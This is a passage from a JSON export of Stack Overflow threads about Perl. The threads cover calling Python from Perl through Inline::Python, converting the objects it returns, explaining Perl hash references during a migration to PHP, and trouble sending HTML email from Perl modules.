prototypes</a>."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466499497, "post_id": 37938870, "comment_id": 63328723, "body": "If it&#39;s like that then maybe it would be a better idea to rip that part out completely, reimplement it in a technology the team will feel more comfortable using, and then sticking that in through an API. For the last part you of course need to write some kind of client for that API in Perl, but that seems to be the least problematic approach. All those inlining things are nice for playing around, but I am not so sure I would want to use that in production."}], "answers": [{"tags": [], "owner": {"reputation": 5143, "user_id": 5699852, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/f945663f0c248f41c09a1db32f7816c4?s=128&d=identicon&r=PG&f=1", "display_name": "Sharad", "link": "https://stackoverflow.com/users/5699852/sharad"}, "is_accepted": true, "score": 3, "last_activity_date": 1466497138, "creation_date": 1466497138, "answer_id": 37939073, "question_id": 37938870, "link": "https://stackoverflow.com/questions/37938870/call-node-js-or-python-from-perl/37939073#37939073", "title": "Call Node.js (or python) from Perl", "body": "<p>For Python, I'd recommed inline-python module from CPAN:\n<a href=\"http://search.cpan.org/dist/Inline-Python/Python.pod\" rel=\"nofollow\">http://search.cpan.org/dist/Inline-Python/Python.pod</a></p>\n\n<p>Example:</p>\n\n<pre><code>   use Inline Python =&gt; &lt;&lt;END;\n\n   def Foo():\n       class Bar:\n           def __init__(self):\n               print \"new Bar()\"\n           def tank(self):\n               return 10\n       return Bar()\n\n   END\n\n   my $o = Foo();\n   print $o-&gt;tank(), \"\\n\";\n</code></pre>\n"}], "owner": {"reputation": 1595, "user_id": 5276890, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/VfQC8.jpg?s=128&g=1", "display_name": "Roy Falk", "link": "https://stackoverflow.com/users/5276890/roy-falk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 707, "favorite_count": 0, "closed_date": 1466710983, "accepted_answer_id": 37939073, "answer_count": 1, "score": 1, "last_activity_date": 1466497138, "creation_date": 1466496532, "question_id": 37938870, "link": "https://stackoverflow.com/questions/37938870/call-node-js-or-python-from-perl", "closed_reason": "Needs more focus", "title": "Call Node.js (or python) from Perl", "body": "<p>I have a legacy system written in Perl that I'd like to start migrating away from to something more modern. Python is my personal preference, but the team is very JS oriented.</p>\n\n<p>I'd like to migrate various perl modules to node or python as step one of the process. Prior research includes googling (all results in opposite direction) and stack overflow (nothing relevant). I am aware of <a href=\"http://www.perlhowto.com/executing_external_commands\" rel=\"nofollow\">backticks</a> but was wondering if there's anything more structured like JNI or if someone has some alternative and more elegant solution.</p>\n"}, {"tags": ["python", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 4, "creation_date": 1466495339, "post_id": 37937897, "comment_id": 63326147, "body": "Those objects follow the <a href=\"http://perldoc.perl.org/perlobj.html#Inside-Out-objects\" rel=\"nofollow noreferrer\">inside-out pattern</a>. You need to use their interface, which is unfortunately not that easy to guess. Can you create a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> with a tiny bit of Python code that produces this output in Perl so we can try?"}, {"owner": {"reputation": 3037, "user_id": 224511, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/a3c6ce6aad74e51bfaa87dc5ba3f1477?s=128&d=identicon&r=PG", "display_name": "askvictor", "link": "https://stackoverflow.com/users/224511/askvictor"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466506291, "post_id": 37937897, "comment_id": 63333451, "body": "@simbabque Thanks; have added sample code. Interestingly, if I throw only the data structure that the code returns in the Inline section, it works fine, but if it runs the code as shown, it breaks."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466506569, "post_id": 37937897, "comment_id": 63333641, "body": "Does your code not have <code>strict</code> and <code>warnings</code>?"}, {"owner": {"reputation": 3037, "user_id": 224511, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/a3c6ce6aad74e51bfaa87dc5ba3f1477?s=128&d=identicon&r=PG", "display_name": "askvictor", "link": "https://stackoverflow.com/users/224511/askvictor"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466507187, "post_id": 37937897, "comment_id": 63334048, "body": "The real code did; didn&#39;t bother with the sample code. Is there now, but makes no difference. Dumping the straight data structure as per <a href=\"https://gist.github.com/askvictor/119c24b6fc46a77b349b307457e1a027\" rel=\"nofollow noreferrer\">gist.github.com/askvictor/119c24b6fc46a77b349b307457e1a027</a> works"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466507218, "post_id": 37937897, "comment_id": 63334067, "body": "I think this boils down to knowing how to dump those data structures. See <a href=\"https://metacpan.org/source/NINE/Inline-Python-0.49/Python.pm#L311\" rel=\"nofollow noreferrer\">metacpan.org/source/NINE/Inline-Python-0.49/Python.pm#L311</a> to how those works. Try dereferencing and Dumping that. <code>print Dumper \\%$data</code>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466507254, "post_id": 37937897, "comment_id": 63334086, "body": "In your gist it&#39;s not an object any more, it&#39;s just a data structure."}, {"owner": {"reputation": 3037, "user_id": 224511, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/a3c6ce6aad74e51bfaa87dc5ba3f1477?s=128&d=identicon&r=PG", "display_name": "askvictor", "link": "https://stackoverflow.com/users/224511/askvictor"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466507833, "post_id": 37937897, "comment_id": 63334474, "body": "It&#39;s the deeper structures that I can&#39;t get to $data-&gt;{song_hits}[0] (sorry, my perl is very, very rusty)"}, {"owner": {"reputation": 3037, "user_id": 224511, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/a3c6ce6aad74e51bfaa87dc5ba3f1477?s=128&d=identicon&r=PG", "display_name": "askvictor", "link": "https://stackoverflow.com/users/224511/askvictor"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466554528, "post_id": 37937897, "comment_id": 63361211, "body": "@simbabque - the data passed from the Python Code <i>is</i> just a data structure; not an object (<code>type(r)</code> returns <code>dict</code>). In any case, is there a way (in perl) to freeze or evaluate the data returned from Python so that it can function like the data structure shown in the gist? Thanks for all the suggestions btw!"}, {"owner": {"reputation": 3037, "user_id": 224511, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/a3c6ce6aad74e51bfaa87dc5ba3f1477?s=128&d=identicon&r=PG", "display_name": "askvictor", "link": "https://stackoverflow.com/users/224511/askvictor"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466566270, "post_id": 37937897, "comment_id": 63363787, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/115258/discussion-between-askvictor-and-simbabque\">continue this discussion in chat</a>."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466587043, "post_id": 37937897, "comment_id": 63373911, "body": "I wrote stuff in the chat."}], "answers": [{"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1466573884, "post_id": 37958490, "comment_id": 63366022, "body": "Glad to see you got it!  Btw, <code>song_hits</code> needs a dollar sign in front, for <code>$song_hits</code>."}], "tags": [], "owner": {"reputation": 3037, "user_id": 224511, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/a3c6ce6aad74e51bfaa87dc5ba3f1477?s=128&d=identicon&r=PG", "display_name": "askvictor", "link": "https://stackoverflow.com/users/224511/askvictor"}, "is_accepted": false, "score": 1, "last_activity_date": 1466586538, "last_edit_date": 1466586538, "creation_date": 1466569220, "answer_id": 37958490, "question_id": 37937897, "link": "https://stackoverflow.com/questions/37937897/how-do-i-use-or-convert-or-view-inline-python-objects-in-perl/37958490#37958490", "title": "How do I use (or convert, or view) inline Python objects in Perl?", "body": "<p>I've got this working through a 'useless' list comprehension inside a <code>py_eval()</code>. It seems that Perl's Inline Python doesn't handle lists of the type <code>future.types.newlist.newlist</code> that are returned from the python code. So this code converts those into plain old lists, which Perl can then handle.</p>\n\n<pre><code>my $song_hits = py_eval(\"[x for x in $data-&gt;{song_hits}]\", 0);\nfor my $hit (@$song_hits) {\n    print $hit-&gt;{track}-&gt;{title};\n    print \"\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 3037, "user_id": 224511, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/a3c6ce6aad74e51bfaa87dc5ba3f1477?s=128&d=identicon&r=PG", "display_name": "askvictor", "link": "https://stackoverflow.com/users/224511/askvictor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 290, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1598221411, "creation_date": 1466493520, "last_edit_date": 1598221411, "question_id": 37937897, "link": "https://stackoverflow.com/questions/37937897/how-do-i-use-or-convert-or-view-inline-python-objects-in-perl", "title": "How do I use (or convert, or view) inline Python objects in Perl?", "body": "<p>I'm resurrecting some orphaned code, which is written in Perl but uses inline Python. A call to the Python module returns an array of dicts or Python objects. I'm really struggling with how to access the data structures within - if I try to straight out log (print) the data structure, it appears to give the data fine, but if I index the top level array (or iterate in a list) it tells me the it's not an array reference. If I try use Dumper on the object I get:</p>\n<pre><code>$VAR1 = bless( do{\\(my $o = '140162464462376')}, 'Inline::Python::Object' );\n</code></pre>\n<p>Any ideas how I can use (or convert) this object?</p>\n<p>EDIT: sample code is below. This requires a Google Music account, installing the gmusicapi python module (for they python side; obviously inline python for the perl side). Interestingly, I wrote some python code and dumped into the Inline Python section only the data structure that the API call returned - it worked fine (see <a href=\"https://gist.github.com/askvictor/119c24b6fc46a77b349b307457e1a027\" rel=\"nofollow noreferrer\">https://gist.github.com/askvictor/119c24b6fc46a77b349b307457e1a027</a> ). When I actually put the API call into the Inline Python section, it breaks at line 4 with <code>Not an ARRAY reference at sample.pl line 4.</code></p>\n<pre><code>use strict;\nuse warnings;\n\nmy $data = search(&quot;radiohead&quot;);\nprint &quot;$data\\n&quot;;\nprint &quot;$data-&gt;{song_hits}\\n&quot;;\nprint &quot;$data-&gt;{song_hits}[0]\\n&quot;;\nfor my $hit (@{$data-&gt;{song_hits}}){\n    print &quot;$hit-&gt;{track}-&gt;{title}\\n&quot;;\n}\n\nuse Inline Python =&gt; &lt;&lt;'END_OF_PYTHON_CODE';\nimport gmusicapi\n\nUSERNAME=&quot;my_username@gmail.com&quot;\nPASSWORD=&quot;sooper_secr3t&quot;\nDEVICE_ID = &quot;12345abcde123&quot; # this can be obtained using https://raw.githubusercontent.com/squeezebox-googlemusic/squeezebox-googlemusic/master/mobile_devices.py\ndef search(needle):\n    c = gmusicapi.Mobileclient()\n    c.login(USERNAME, PASSWORD, DEVICE_ID)\n    r = c.search(needle, 2)\n    return r\nEND_OF_PYTHON_CODE\n</code></pre>\n"}, {"tags": ["php", "windows", "perl", "laravel"], "comments": [{"owner": {"reputation": 3082, "user_id": 6425936, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DXSpT.jpg?s=128&g=1", "display_name": "GROVER.", "link": "https://stackoverflow.com/users/6425936/grover"}, "edited": false, "score": 0, "creation_date": 1466492957, "post_id": 37937528, "comment_id": 63324829, "body": "Ask the guy who developed it, maybe?"}, {"owner": {"reputation": 2051, "user_id": 2863018, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a27fc29c67f771ab6518b31388f2706f?s=128&d=identicon&r=PG&f=1", "display_name": "Ben Hillier", "link": "https://stackoverflow.com/users/2863018/ben-hillier"}, "reply_to_user": {"reputation": 3082, "user_id": 6425936, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DXSpT.jpg?s=128&g=1", "display_name": "GROVER.", "link": "https://stackoverflow.com/users/6425936/grover"}, "edited": false, "score": 0, "creation_date": 1466493461, "post_id": 37937528, "comment_id": 63325072, "body": "@CaelanGrgurovic I don&#39;t know where you&#39;ve worked in the past, but it&#39;s happened to me far too often that the original programmer is no longer around to help!"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1466493545, "post_id": 37937528, "comment_id": 63325119, "body": "<a href=\"http://p3rl.org/perlreftut\" rel=\"nofollow noreferrer\">perlreftut</a>, <a href=\"http://p3rl.org/perlref\" rel=\"nofollow noreferrer\">perlref</a>,  <a href=\"http://p3rl.org/perllol\" rel=\"nofollow noreferrer\">perllol</a>, <a href=\"http://p3rl.org/perldsc\" rel=\"nofollow noreferrer\">perldsc</a>."}, {"owner": {"reputation": 3082, "user_id": 6425936, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DXSpT.jpg?s=128&g=1", "display_name": "GROVER.", "link": "https://stackoverflow.com/users/6425936/grover"}, "edited": false, "score": 0, "creation_date": 1466493563, "post_id": 37937528, "comment_id": 63325130, "body": "Oh :/ I&#39;m only 15 so I&#39;ve never had a chance to work at a programming company :( most of them require you to be 18 or older where I am."}, {"owner": {"reputation": 10360, "user_id": 3986005, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kUYP4.jpg?s=128&g=1", "display_name": "KIKO Software", "link": "https://stackoverflow.com/users/3986005/kiko-software"}, "edited": false, "score": 1, "creation_date": 1466493617, "post_id": 37937528, "comment_id": 63325166, "body": "Perhaps this will help? <a href=\"http://perldoc.perl.org/index-language.html\" rel=\"nofollow noreferrer\">perldoc.perl.org/index-language.html</a> and <a href=\"http://php.net/manual/en\" rel=\"nofollow noreferrer\">php.net/manual/en</a> No serious, you seem very ill-equiped to do this task. Syntax shouldn&#39;t be a stumbling block."}, {"owner": {"reputation": 2051, "user_id": 2863018, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a27fc29c67f771ab6518b31388f2706f?s=128&d=identicon&r=PG&f=1", "display_name": "Ben Hillier", "link": "https://stackoverflow.com/users/2863018/ben-hillier"}, "edited": false, "score": 0, "creation_date": 1466494187, "post_id": 37937528, "comment_id": 63325515, "body": "That&#39;s horrendous Perl. The guy who wrote it didn&#39;t want people to understand it, I reckon. I think it&#39;s reading from a database to create a hash of hashes, but I can&#39;t see what that data is then used for, because that code is not included. I would be tempted to use Perl&#39;s Data::Dumper library to view the resulting data structure, and then re-write it in PHP from scratch."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 3, "creation_date": 1466498670, "post_id": 37937528, "comment_id": 63328184, "body": "I don&#39;t know how you spent your three days trying to figure it out, but if I had to use a language that I knew nothing about, I&#39;d get <a href=\"http://shop.oreilly.com/product/9781118013847.do\" rel=\"nofollow noreferrer\">a good book</a> and spend the first couple of days working through that."}], "answers": [{"comments": [{"owner": {"reputation": 534, "user_id": 6356910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17f5d88fc45e4185aa228d3ef08f0442?s=128&d=identicon&r=PG&f=1", "display_name": "Otterbein", "link": "https://stackoverflow.com/users/6356910/otterbein"}, "edited": false, "score": 0, "creation_date": 1466494836, "post_id": 37938175, "comment_id": 63325896, "body": "Ah, you were faster :)"}, {"owner": {"reputation": 83, "user_id": 4507275, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/522f64c21f169285a481ec774fd26c12?s=128&d=identicon&r=PG&f=1", "display_name": "Albert Leonardo Pisa", "link": "https://stackoverflow.com/users/4507275/albert-leonardo-pisa"}, "edited": false, "score": 0, "creation_date": 1466565227, "post_id": 37938175, "comment_id": 63363551, "body": "Thank you so much ! @Piotr really helping me"}], "tags": [], "owner": {"reputation": 497, "user_id": 668247, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9753585e9c97a4009c17adffe41f9f47?s=128&d=identicon&r=PG", "display_name": "vikin9", "link": "https://stackoverflow.com/users/668247/vikin9"}, "is_accepted": true, "score": 3, "last_activity_date": 1466584459, "last_edit_date": 1466584459, "creation_date": 1466494377, "answer_id": 37938175, "question_id": 37937528, "link": "https://stackoverflow.com/questions/37937528/migrating-from-perl-to-php/37938175#37938175", "title": "migrating from perl to php", "body": "<p>I don't use php, but I try to explain the code in general:</p>\n\n<pre><code># while there is data in the object that is returned by calling the method \"fetchrow_hashref\" of the object $query: it means, get a single data row from the database \nwhile (my $data=$query-&gt;fetchrow_hashref) {\n\n    # add the value stored in field \"oid\" from the hash \"data\" to array \"oid_list\"\n    # what is hash? kind of array indexed by strings. Red more about hashes here: http://perlmaven.com/perl-hashes\n    push @oid_list, $data-&gt;{oid};\n\n    # add the value stored in field \"function\" of the hash \"data\" to \n    # an array that is found in a reference, which reference is stored in hash \"snmp_order\" under \n    # a field that is named the same as the value of variable $sensor\n    push @{$snmp_order-&gt;{$sensor}}, $data-&gt;{function};\n\n    # now: the data-&gt;oid is added to oid_hash. I will use array notation to explain where it lands:\n    # oid_hash[$sensor][$data-&gt;{function}][oid] =  $data-&gt;{oid}\n    $oid_hash-&gt;{$sensor}-&gt;{$data-&gt;{function}}-&gt;{oid}=$data-&gt;{oid};\n\n    # oid_hash[$sensor][$data-&gt;{function}][scale] =  $data-&gt;{scale}\n    # $sensor and $data-&gt;{function} are variables!\n    $oid_hash-&gt;{$sensor}-&gt;{$data-&gt;{function}}-&gt;{scale}=$data-&gt;{scale};\n}\n</code></pre>\n\n<p>You can read more about Perl hashes, for example here (I repeat myself): <a href=\"http://perlmaven.com/perl-hashes\" rel=\"nofollow\">http://perlmaven.com/perl-hashes</a></p>\n"}, {"tags": [], "owner": {"reputation": 534, "user_id": 6356910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17f5d88fc45e4185aa228d3ef08f0442?s=128&d=identicon&r=PG&f=1", "display_name": "Otterbein", "link": "https://stackoverflow.com/users/6356910/otterbein"}, "is_accepted": false, "score": 3, "last_activity_date": 1466494820, "creation_date": 1466494820, "answer_id": 37938307, "question_id": 37937528, "link": "https://stackoverflow.com/questions/37937528/migrating-from-perl-to-php/37938307#37938307", "title": "migrating from perl to php", "body": "<p>Well since I'm not an php-programmer I just can tell you what the perl-code means. Maybe it helps you a bit further!</p>\n\n<pre><code>#an query to the Database was fired through the DBI-module from Perl\n#the result is temporarily stored in the $query but has to be fetched\n#before further use. Since the result could contain multiple rows the $data\n#is filled with each row while the -&gt;fetchrow_hashref() function returns a hash of\n#data representing one returned row of the query. The keys of the hash are the column\n#names of the database-table\nwhile(my $data = $query-&gt;fetchrow_hashref){...}\n</code></pre>\n\n<p>The <code>@</code> indicates an array in Perl. So the <code>@oid_list</code> is treated as one. Therefore it is possible to push a value <code>$data-&gt;{oid}</code> into it (<code>push @oid_list, $data-&gt;{oid}</code>).</p>\n\n<p>The Syntax <code>$data-&gt;{oid}</code> is a bit more complex. Imagine that the <code>$data</code> is a <strong>reference</strong> (simply a pointer) to a Hash (or in other languages like java called Map). But you rather want to access the <strong>hash behind</strong> this reference. So you use the <code>-&gt;</code> to <strong>dereference</strong> the pointer and access the real hash the <code>$data</code> is pointing to. By <code>$data-&gt;{oid}</code> you acces the value behind the key <code>oid</code> in the Hashreferenceby <code>$data</code>.</p>\n\n<p>A similiar thing happens in the <code>push @{$snmp_order-&gt;{$sensor}}, $data-&gt;{function};</code>. But here you first have to access the real array behind the reference <code>$snmp_order-&gt;{$sensor}</code>. Here a key of an referenced hash contains a <strong>array reference</strong> that is getting pushe the value <code>$data-&gt;{function};</code> into it.</p>\n\n<p>The rest of the code is a kind of these two things. The programmer just assigns different values from the fetched database-row <code>$data</code> into different keys of a big hash-reference <code>$oid_hash</code>. Within the <code>{}</code> you will always find the name of the key which is accessed.</p>\n"}], "owner": {"reputation": 83, "user_id": 4507275, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/522f64c21f169285a481ec774fd26c12?s=128&d=identicon&r=PG&f=1", "display_name": "Albert Leonardo Pisa", "link": "https://stackoverflow.com/users/4507275/albert-leonardo-pisa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 159, "favorite_count": 0, "accepted_answer_id": 37938175, "answer_count": 2, "score": 0, "last_activity_date": 1466584459, "creation_date": 1466492441, "last_edit_date": 1466530636, "question_id": 37937528, "link": "https://stackoverflow.com/questions/37937528/migrating-from-perl-to-php", "title": "migrating from perl to php", "body": "<p>I have no experience in Perl at all, and also beginner in PHP. I need to migrate the old company system using Perl to new one using PHP. Here is some code in Perl I didn't understand:</p>\n\n<pre><code>while (my $data=$query-&gt;fetchrow_hashref) {\n        push @oid_list, $data-&gt;{oid};\n        push @{$snmp_order-&gt;{$sensor}}, $data-&gt;{function};\n        $oid_hash-&gt;{$sensor}-&gt;{$data-&gt;{function}}-&gt;{oid}=$data-&gt;{oid};\n        $oid_hash-&gt;{$sensor}-&gt;{$data-&gt;{function}}-&gt;{scale}=$data-&gt;{scale};\n    }\n</code></pre>\n\n<p>Can someone explain what does the code mean and what it will become in PHP? Also, what does <code>$a-&gt;{$b}</code> mean in Perl?</p>\n\n<p>I've been trying to figure it out since 3 days but still having difficulties dealing with it.</p>\n"}, {"tags": ["html", "perl", "email"], "comments": [{"owner": {"reputation": 19, "user_id": 4348882, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ljGqZfIJza8/AAAAAAAAAAI/AAAAAAAAAQY/UqAPyEjuQGA/photo.jpg?sz=128", "display_name": "Hans", "link": "https://stackoverflow.com/users/4348882/hans"}, "edited": false, "score": 0, "creation_date": 1466489727, "post_id": 37936753, "comment_id": 63323204, "body": "<code>my $body =&#39;&lt;h1&gt;buddy I got it . . . &lt;&#47;h1&gt;&#39;;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 368, "user_id": 6430078, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204857806084476/picture?type=large", "display_name": "Sergio Bernardo", "link": "https://stackoverflow.com/users/6430078/sergio-bernardo"}, "is_accepted": false, "score": 0, "last_activity_date": 1466691942, "creation_date": 1466691942, "answer_id": 37994477, "question_id": 37936753, "link": "https://stackoverflow.com/questions/37936753/emailsendsmtpgmail-html-tags-not-working/37994477#37994477", "title": "Email::Send::SMTP::Gmail html tags not working", "body": "<p>You are placing HTML code inside the content of a plain text email.\nThis module doesn't seem to support HTML emails... you must provide the headers yourself if you whant to send HTML in your email, or find a module that does it for you.</p>\n\n<p>The key:  <strong>-contenttype=>'text/html'</strong>  most likely is being ignored... it is not mentioned in the module docs!</p>\n"}], "owner": {"reputation": 19, "user_id": 4348882, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ljGqZfIJza8/AAAAAAAAAAI/AAAAAAAAAQY/UqAPyEjuQGA/photo.jpg?sz=128", "display_name": "Hans", "link": "https://stackoverflow.com/users/4348882/hans"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 455, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1466691942, "creation_date": 1466489478, "last_edit_date": 1466518760, "question_id": 37936753, "link": "https://stackoverflow.com/questions/37936753/emailsendsmtpgmail-html-tags-not-working", "title": "Email::Send::SMTP::Gmail html tags not working", "body": "<pre><code>#!/usr/bin/perl\nmy $mail=Email::Send::SMTP::Gmail-&gt;new( -smtp=&gt;'smtp.gmail.com',\n                                            -login=&gt;'sample@gmail.com',\n                                            -pass=&gt;'password');\nmy $body = '&lt;h1&gt;buddy I got it ...&lt;/h1&gt;';\n$mail-&gt;send(-to=&gt;'to@gmail.com',-cc=&gt;'',-subject=&gt;'subject',\n            -body=&gt;$body,-contenttype=&gt;'text/html');\n$mail-&gt;bye;\n</code></pre>\n\n<p><a href=\"http://i.stack.imgur.com/P8BhF.png\" rel=\"nofollow\">Everytime i run my script here's the output </a></p>\n\n<p>Can somebody suggest and help me out why is that my html (body email )not working .</p>\n"}, {"tags": ["php", "perl", "email"], "comments": [{"owner": {"reputation": 3498, "user_id": 646765, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/388c9a8c75261488488345aba7f78d3b?s=128&d=identicon&r=PG", "display_name": "Jerzyk", "link": "https://stackoverflow.com/users/646765/jerzyk"}, "edited": false, "score": 2, "creation_date": 1466488494, "post_id": 37936229, "comment_id": 63322762, "body": "have you seen a comment at the top of this module documentation? <i>&quot;MIME::Lite is not recommended by its current maintainer. There are a number of alternatives, like Email::MIME or MIME::Entity and Email::Sender, which you should probably use instead. MIME::Lite continues to accrue weird bug reports, and it is not receiving a large amount of refactoring due to the availability of better alternatives. Please consider using something else.&quot;</i> (I suppose you are getting timeouts while connecting to SMTP server)"}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "edited": false, "score": 0, "creation_date": 1466492362, "post_id": 37936229, "comment_id": 63324500, "body": "Have you inspected sendmail&#39;s  outgoing mail queue? (<code>mailq</code>)  Have you inspected sendmail&#39;s log files? [AFAIK MIME::Lite uses sendmail as default sending method]"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466497656, "post_id": 37936229, "comment_id": 63327535, "body": "Why do you implement part of the backend of your program in PHP and another part in Perl? Maintenance-wise it seems to make more sense to stick with one technology."}, {"owner": {"reputation": 31, "user_id": 3417560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0f90a94fdcab0a82f4b81467ede690e?s=128&d=identicon&r=PG&f=1", "display_name": "Dave", "link": "https://stackoverflow.com/users/3417560/dave"}, "edited": false, "score": 0, "creation_date": 1466547331, "post_id": 37936229, "comment_id": 63359204, "body": "Huh. You know I never considered using PHP for all parts of the solution. That...makes sense. That&#39;s what I get for inheriting some code and not really questioning the status quo."}, {"owner": {"reputation": 31, "user_id": 3417560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0f90a94fdcab0a82f4b81467ede690e?s=128&d=identicon&r=PG&f=1", "display_name": "Dave", "link": "https://stackoverflow.com/users/3417560/dave"}, "edited": false, "score": 0, "creation_date": 1466548010, "post_id": 37936229, "comment_id": 63359428, "body": "And thanks for pointing out that MIME::Lite isn&#39;t recommended. I&#39;ll make some changes."}], "owner": {"reputation": 31, "user_id": 3417560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0f90a94fdcab0a82f4b81467ede690e?s=128&d=identicon&r=PG&f=1", "display_name": "Dave", "link": "https://stackoverflow.com/users/3417560/dave"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 36, "favorite_count": 0, "answer_count": 0, "score": 2, 